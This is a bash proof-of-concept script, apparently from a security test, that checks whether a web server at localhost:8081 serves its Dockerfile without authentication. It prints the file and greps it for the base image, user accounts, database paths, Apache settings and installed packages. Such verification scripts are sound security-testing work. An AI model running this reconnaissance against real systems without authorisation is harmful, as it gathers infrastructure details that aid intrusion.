#!/bin/bash

# POC: Publicly Exposed Dockerfile Revealing Infrastructure Secrets
# Target: http://localhost:8081/Dockerfile
# This script demonstrates that the Dockerfile is accessible without authentication

TARGET_URL="http://localhost:8081/Dockerfile"
echo "[*] Testing for publicly exposed Dockerfile..."
echo "[*] Target: $TARGET_URL"
echo ""

# Attempt to fetch the Dockerfile
echo "[*] Sending GET request to retrieve Dockerfile..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

# Check if response is 200 OK
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: Dockerfile is publicly accessible (HTTP 200)"
    echo ""
    echo "[+] Dockerfile Content:"
    echo "=================================================="
    echo "$BODY"
    echo "=================================================="
    echo ""
    
    # Extract sensitive information
    echo "[+] Extracting Sensitive Information:"
    echo ""
    
    # Check for base image
    if echo "$BODY" | grep -q "FROM php:"; then
        BASE_IMAGE=$(echo "$BODY" | grep "FROM php:" | head -1)
        echo "  [!] Base Image Detected: $BASE_IMAGE"
    fi
    
    # Check for user creation
    if echo "$BODY" | grep -q "groupadd\|useradd"; then
        echo "  [!] User Configuration Detected:"
        echo "$BODY" | grep -E "groupadd|useradd" | sed 's/^/      /'
    fi
    
    # Check for database paths
    if echo "$BODY" | grep -q "/var/db"; then
        echo "  [!] Database Path Detected: /var/db"
    fi
    
    # Check for Apache configuration
    if echo "$BODY" | grep -q "Listen\|apache"; then
        echo "  [!] Apache Configuration Detected:"
        echo "$BODY" | grep -i "listen\|apache" | sed 's/^/      /'
    fi
    
    # Check for workdir
    if echo "$BODY" | grep -q "WORKDIR"; then
        WORKDIR=$(echo "$BODY" | grep "WORKDIR" | head -1)
        echo "  [!] Application Directory: $WORKDIR"
    fi
    
    # Check for installed packages
    if echo "$BODY" | grep -qE "apt-get install|RUN.*composer|RUN.*git"; then
        echo "  [!] Installed Packages/Tools Detected:"
        echo "$BODY" | grep -iE "apt-get|composer|git|sqlite" | sed 's/^/      /'
    fi
    
    echo ""
    echo "[+] Vulnerability Confirmed: Infrastructure secrets are publicly exposed"
    exit 0
else
    echo "[-] FAILED: Dockerfile not accessible (HTTP $HTTP_CODE)"
    exit 1
fi